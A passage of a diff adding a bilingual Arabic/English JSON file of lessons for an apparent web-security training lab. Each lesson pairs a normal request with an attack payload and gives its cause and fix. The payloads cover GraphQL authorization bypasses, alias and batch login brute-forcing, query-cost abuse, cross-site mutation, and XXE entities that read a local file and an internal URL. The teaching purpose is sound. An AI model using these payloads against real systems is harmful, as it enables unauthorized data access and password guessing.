+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-node",
+    "group": "graphql",
+    "title": {
+      "ar": "تجاوز الملكية عبر node",
+      "en": "Ownership bypass through node"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "{ node(id:\"doc-alice\") { id owner content } }"
+    },
+    "attack": {
+      "query": "{ node(id:\"doc-bob\") { id owner content } }"
+    },
+    "cause": {
+      "ar": "المسار node يسترجع معرفاً دون تحقق ملكيته.",
+      "en": "The node resolver loads an ID without checking ownership."
+    },
+    "fix": {
+      "ar": "تحقق من ملكية المورد حتى في مسارات الاسترجاع العامة.",
+      "en": "Check ownership even in generic retrieval resolvers."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: المسار node يسترجع معرفاً دون تحقق ملكيته.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: The node resolver loads an ID without checking ownership."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. تحقق من ملكية المورد حتى في مسارات الاسترجاع العامة.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Check ownership even in generic retrieval resolvers."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-tenant",
+    "group": "graphql",
+    "title": {
+      "ar": "علاقة تكشف مؤسسة أخرى",
+      "en": "Cross-tenant nested relation"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "{ tenant(id:\"north\") { id documents { id owner content } } }"
+    },
+    "attack": {
+      "query": "{ tenant(id:\"south\") { id documents { id owner content } } }"
+    },
+    "cause": {
+      "ar": "علاقة المؤسسة تسمح بمعرف مؤسسة خارج جلسة Alice.",
+      "en": "A tenant relationship accepts an organization outside Alice’s session."
+    },
+    "fix": {
+      "ar": "طبّق حدود المؤسسة عند كل علاقة واستعلام.",
+      "en": "Enforce tenant boundaries at every relationship and query."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: علاقة المؤسسة تسمح بمعرف مؤسسة خارج جلسة Alice.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: A tenant relationship accepts an organization outside Alice’s session."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. طبّق حدود المؤسسة عند كل علاقة واستعلام.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Enforce tenant boundaries at every relationship and query."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-mutation",
+    "group": "graphql",
+    "title": {
+      "ar": "Mutation تعدل مورد الغير",
+      "en": "Unauthorized document mutation"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "mutation { renameDocument(id:\"doc-alice\",title:\"My title\") { id title } }"
+    },
+    "attack": {
+      "query": "mutation { renameDocument(id:\"doc-bob\",title:\"Changed\") { id title } }"
+    },
+    "cause": {
+      "ar": "التعديل يصل للسجل دون صلاحية على المستند المستهدف.",
+      "en": "A mutation reaches storage without permission on its target document."
+    },
+    "fix": {
+      "ar": "افرض صلاحية العملية والمورد قبل التعديل.",
+      "en": "Authorize both operation and target before mutation."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: التعديل يصل للسجل دون صلاحية على المستند المستهدف.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: A mutation reaches storage without permission on its target document."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. افرض صلاحية العملية والمورد قبل التعديل.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Authorize both operation and target before mutation."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-aliases",
+    "group": "graphql",
+    "title": {
+      "ar": "Aliases تتجاوز عدّاد العملية",
+      "en": "Aliases bypass an operation counter"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "{ one:login(password:\"wrong\") { authenticated checked attempt status } }"
+    },
+    "attack": {
+      "query": "{ a:login(password:\"wrong\") { authenticated checked attempt status } b:login(password:\"wrong\") { authenticated checked attempt status } c:login(password:\"wrong\") { authenticated checked attempt status } d:login(password:\"wrong\") { authenticated checked attempt status } }"
+    },
+    "cause": {
+      "ar": "يُحتسب طلب HTTP واحد رغم تنفيذ أربع محاولات تحقق.",
+      "en": "One HTTP request is counted despite four verification attempts."
+    },
+    "fix": {
+      "ar": "احتسب كل عملية حساسة لا عدد رسائل HTTP فقط.",
+      "en": "Count each sensitive operation, not just HTTP envelopes."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: يُحتسب طلب HTTP واحد رغم تنفيذ أربع محاولات تحقق.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: One HTTP request is counted despite four verification attempts."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. احتسب كل عملية حساسة لا عدد رسائل HTTP فقط.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Count each sensitive operation, not just HTTP envelopes."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-batch",
+    "group": "graphql",
+    "title": {
+      "ar": "تجميع عمليات يتجاوز الميزانية",
+      "en": "Batch bypasses verification budget"
+    },
+    "level": "advanced",
+    "normal": {
+      "queries": [
+        "{ a:login(password:\"wrong\") { authenticated checked attempt status } }"
+      ]
+    },
+    "attack": {
+      "queries": [
+        "{ a:login(password:\"wrong\") { authenticated checked attempt status } }",
+        "{ a:login(password:\"wrong\") { authenticated checked attempt status } }",
+        "{ a:login(password:\"wrong\") { authenticated checked attempt status } }",
+        "{ a:login(password:\"wrong\") { authenticated checked attempt status } }"
+      ]
+    },
+    "cause": {
+      "ar": "تُصفّر الميزانية عند كل عملية داخل batch نفسه.",
+      "en": "The budget resets for each operation in the same batch."
+    },
+    "fix": {
+      "ar": "اجمع كلفة العمليات تحت هوية واحدة وحدود مشتركة.",
+      "en": "Aggregate operations under one identity and shared budget."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: تُصفّر الميزانية عند كل عملية داخل batch نفسه.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: The budget resets for each operation in the same batch."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. اجمع كلفة العمليات تحت هوية واحدة وحدود مشتركة.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Aggregate operations under one identity and shared budget."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-depth",
+    "group": "graphql",
+    "title": {
+      "ar": "عمق استعلام غير مضبوط",
+      "en": "Unbounded query depth"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "{ me { id } }"
+    },
+    "attack": {
+      "query": "{ me { manager { manager { manager { manager { manager { id } } } } } } }"
+    },
+    "cause": {
+      "ar": "تتبع العلاقات المتكررة يولد عملاً أعمق من الحد المسموح.",
+      "en": "Repeated relations create work beyond the permitted depth."
+    },
+    "fix": {
+      "ar": "افحص عمق AST قبل تشغيل الـresolvers.",
+      "en": "Check AST depth before running resolvers."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: تتبع العلاقات المتكررة يولد عملاً أعمق من الحد المسموح.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: Repeated relations create work beyond the permitted depth."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. افحص عمق AST قبل تشغيل الـresolvers.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Check AST depth before running resolvers."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-cost",
+    "group": "graphql",
+    "title": {
+      "ar": "Pagination تتجاوز كلفة التنفيذ",
+      "en": "Pagination exceeds query budget"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "{ documents(first:2) { id owner } }"
+    },
+    "attack": {
+      "query": "{ documents(first:100) { id owner } }"
+    },
+    "cause": {
+      "ar": "حقل first الكبير يضاعف العمل دون ميزانية كلية.",
+      "en": "A large first argument multiplies work without an overall budget."
+    },
+    "fix": {
+      "ar": "احسب الكلفة قبل التنفيذ وافرض حدود صفحات مناسبة.",
+      "en": "Calculate cost before execution and bound pagination."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: حقل first الكبير يضاعف العمل دون ميزانية كلية.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: A large first argument multiplies work without an overall budget."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. احسب الكلفة قبل التنفيذ وافرض حدود صفحات مناسبة.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Calculate cost before execution and bound pagination."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-csrf",
+    "group": "graphql",
+    "title": {
+      "ar": "Mutation عبر طلب غير موثوق",
+      "en": "Cross-site GraphQL mutation"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "mutation { updateNote(note:\"My note\") { note } }",
+      "method": "POST",
+      "origin": "https://academy.test"
+    },
+    "attack": {
+      "query": "mutation { updateNote(note:\"Changed\") { note } }",
+      "method": "GET",
+      "origin": "https://untrusted.test"
+    },
+    "cause": {
+      "ar": "تغيير الملاحظة يُقبل من أصل خارجي وبطريقة GET في النموذج.",
+      "en": "A note-changing mutation accepts a foreign origin and GET in the model."
+    },
+    "fix": {
+      "ar": "ارفض GET لتغيير الحالة وطبّق تحقق CSRF مناسباً للجلسات.",
+      "en": "Reject state-changing GET and enforce appropriate session-bound CSRF checks."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 403
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: تغيير الملاحظة يُقبل من أصل خارجي وبطريقة GET في النموذج.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: A note-changing mutation accepts a foreign origin and GET in the model."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. ارفض GET لتغيير الحالة وطبّق تحقق CSRF مناسباً للجلسات.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Reject state-changing GET and enforce appropriate session-bound CSRF checks."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "graphql-schema",
+    "group": "graphql",
+    "title": {
+      "ar": "اكتشاف عملية إدارية بلا صلاحية",
+      "en": "Discovered admin mutation lacks authorization"
+    },
+    "level": "advanced",
+    "normal": {
+      "query": "{ __schema { queryType { fields { name } } } }"
+    },
+    "attack": {
+      "query": "{ __schema { queryType { fields { name } } } adminExport { secret } }"
+    },
+    "cause": {
+      "ar": "المشكلة غياب صلاحية adminExport؛ introspection وحدها ليست الثغرة.",
+      "en": "The flaw is missing authorization on adminExport, not introspection by itself."
+    },
+    "fix": {
+      "ar": "اسمح بالمخطط حسب السياسة وافرض صلاحية العملية الإدارية.",
+      "en": "Expose schema as appropriate but authorize administrative operations."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 200
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة مستندات بمفسّر GraphQL تعليمي محدود يدعم العمليات والحقول وAliases والمعاملات العددية والنصية. الجلسة Alice؛ بيانات Bob والمؤسسة south خاصة. لا يدعم المحرك Variables أو Fragments. في هذه الحالة: المشكلة غياب صلاحية adminExport؛ introspection وحدها ليست الثغرة.",
+        "en": "A document service uses a bounded GraphQL parser supporting operations, fields, aliases and scalar arguments. Alice is the fixed actor; Bob and south-tenant data are private. Variables and fragments are not supported. In this case: The flaw is missing authorization on adminExport, not introspection by itself."
+      },
+      "interpretation": {
+        "ar": "اقرأ result وerrors وexecuted_fields، ثم before وafter عند التعديل. GraphQL قد يعيد 200 مع خطأ لحقل محدد؛ غياب البيانات الخاصة أو حجب الكلفة الزائدة هو الفرق المطلوب. اسمح بالمخطط حسب السياسة وافرض صلاحية العملية الإدارية.",
+        "en": "Inspect result, errors and executed_fields, then before/after for mutations. GraphQL may return 200 with field errors; withheld private data or rejected excess work establishes the repair. Expose schema as appropriate but authorize administrative operations."
+      },
+      "bad_code": "return resolve_without_authorization_or_budget(ast)",
+      "fixed_code": "validate_operation_budget(ast)\nresolve_each_field_with_authorization(ast)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-file",
+    "group": "xml",
+    "title": {
+      "ar": "قراءة ملف عبر كيان خارجي",
+      "en": "External entity reads a fixture file"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE root [<!ENTITY sample SYSTEM \"file:///fixtures/secret.txt\">]><root>&sample;</root>"
+    },
+    "cause": {
+      "ar": "يحل المحلّل كياناً خارجياً من مصدر المستخدم ويعيد محتواه.",
+      "en": "The parser resolves a user-defined external entity and returns its content."
+    },
+    "fix": {
+      "ar": "عطّل DTD والكيانات الخارجية قبل التحليل.",
+      "en": "Disable DTD and external entities before parsing."
+    },
+    "expected_http": {
+      "vulnerable": 200,
+      "fixed": 400
+    },
+    "lesson": {
+      "story": {
+        "ar": "خدمة استيراد مستندات تقرأ XML بمحلّل فعلي، مع محلّل كيانات تعليمي لا يقرأ إلا خريطة ملفات وعناوين وهمية محددة. لا توجد قراءة لملفات جهازك أو شبكة خارجية. في هذه الحالة: يحل المحلّل كياناً خارجياً من مصدر المستخدم ويعيد محتواه.",
+        "en": "A document import service actually parses XML, with an educational entity resolver restricted to fixed inert file/URL resources. It never reads host files or makes external requests. In this case: The parser resolves a user-defined external entity and returns its content."
+      },
+      "interpretation": {
+        "ar": "قارن resource_requests والنص الناتج وdiagnostic وحجم expanded_bytes. طلب مورد وهمي في السجل يثبت قرار المحلّل المحلي فقط، وليس اتصالاً خارجياً. الإصلاح يعطل الميزة قبل حل الموارد مع بقاء XML السليم مقبولاً. عطّل DTD والكيانات الخارجية قبل التحليل.",
+        "en": "Compare resource_requests, output text, diagnostics and expanded_bytes. A recorded fixture read proves only the local resolver decision, not external connectivity. Repair disables the feature before resolution while accepting ordinary XML. Disable DTD and external entities before parsing."
+      },
+      "bad_code": "document = parse_with_input_defined_entities(xml)",
+      "fixed_code": "reject_dtd_entities_and_xinclude(xml)\ndocument = parse_without_external_resolution(xml)",
+      "steps": [
+        {
+          "ar": "ابدأ بجولة جديدة، حمّل الطلب السليم وأرسله بعد الإصلاح. اقرأ البيانات قبل تغيير أي حقل.",
+          "en": "Start a new round, load the control and send it after repair. Inspect its data before editing."
+        },
+        {
+          "ar": "حمّل مثال الحالة ثم أرسله للنسخة التي تحتوي على مشكلة. حدّد أول خطوة عبرت حدود الثقة.",
+          "en": "Load the case example and send it to the vulnerable variant. Identify the first broken trust boundary."
+        },
+        {
+          "ar": "أرسل نفس الجسم بعد الإصلاح، واقرأ سبب الحجب أو تغير الأثر. لا تعتمد على الرمز وحده.",
+          "en": "Send identical input after repair and inspect rejection or changed impact. Do not rely on HTTP alone."
+        },
+        {
+          "ar": "أعد الطلب السليم في جولة جديدة، ثم غيّر قيمة واحدة واشرح حدود دليلك.",
+          "en": "Verify the control again in a fresh round, change one value and explain the limits of your evidence."
+        }
+      ]
+    }
+  },
+  {
+    "id": "xml-internal",
+    "group": "xml",
+    "title": {
+      "ar": "XXE يصل لمورد داخلي",
+      "en": "XXE reads an internal fixture"
+    },
+    "level": "advanced",
+    "normal": {
+      "xml": "<root><message>Hello</message></root>"
+    },
+    "attack": {
+      "xml": "<!DOCTYPE root [<!ENTITY sample SYSTEM \"https://internal.test/profile\">]><root>&sample;</root>"
+    },
+    "cause": {
+      "ar": "يسمح حل الكيان بالوصول إلى مورد داخلي في خريطة المختبر.",
+      "en": "Entity resolution reaches an internal resource in the fixture map."
+    },
+    "fix": {
